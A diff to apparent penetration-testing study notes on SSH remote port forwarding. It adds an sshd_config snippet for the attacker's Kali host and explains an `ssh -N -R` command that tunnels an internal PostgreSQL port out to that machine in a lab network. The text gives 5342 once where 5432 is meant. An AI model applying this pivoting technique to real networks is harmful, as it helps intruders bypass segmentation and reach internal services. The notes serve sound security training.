@@ -32,7 +32,7 @@ Remote port forwarding is set up with the `-R` flag on the `ssh` command with th
 ssh -R <remote_address:><remote_port>:<destination_address>:<local_port> <username>@<ssh_server>
 ```
 
-* remote\_address is an optional parameter that tells the remote host what address to listen on
+* `remote_address` is an optional parameter that tells the remote host what address to listen on
 
 The diagram below shows how this would look:
 
@@ -85,6 +85,29 @@ tcp   LISTEN 0      128             [::]:22           [::]:*     users:(("sshd",
 
 * Note the server is listening on all interfaces for both IPv4 and IPv6
 
+The `/etc/ssh/sshd_config` file may need to be modified to allow password authentication. Below is a snippet from the config file on the attacker's machine:
+
+{% code title="sshd_config" %}
+```
+...
+# Password authentication configuration
+# To disable tunneled clear text passwords, change to no here!
+PasswordAuthentication yes
+AllowUsers remote-ssh
+PermitEmptyPasswords no
+PermitRootLogin no
+...
+```
+{% endcode %}
+
+* `PasswordAuthentication yes` allows passwords to be used
+* `AllowUsers` sets a list of accepted usernames at login
+  * In this instance only the remote-ssh user can log in remotely via SSH
+* `PermitEmptyPasswords` is fairly self-explanatory
+* `PermitRootLogin no` prevents SSH login as the root user
+
+Server's can be [set up](https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server) to use public key authentication though that presents the challenge of getting public/private keys set up. One cannot just create a singe private key and drop it on any machine they want to use an SSH remote port with.
+
 #### Opening the Remote Forward
 
 Now that the attacker's machine is listening on port 22 for incoming SSH connections, it is possible to create a remote port forward.
@@ -99,7 +122,7 @@ ssh -N -R 127.0.0.1:2345:10.4.222.215:5432 remote-ssh@192.168.45.159
   * `127.0.0.1:2345` tells the attacker's Kali machine SSH receiving the connection where to listen
     * This creates a loopback interface listening for traffic on port `2345` on the Kali machine
   * `10.4.222.215:5342` sets the destination of the traffic flowing through the tunnel
-    * PGDATABASE01 is running PostgreSQL on port `5432` as seen in the [first example](../simple-port-forwarding-scenario.md)
+    * `PGDATABASE01` is running PostgreSQL on port `5432` as seen in the [first example](../simple-port-forwarding-scenario.md)
 * `-N` prevents a shell from opening to just allow traffic through the tunnel
 
 This command has no output but will request the user's password as seen below:
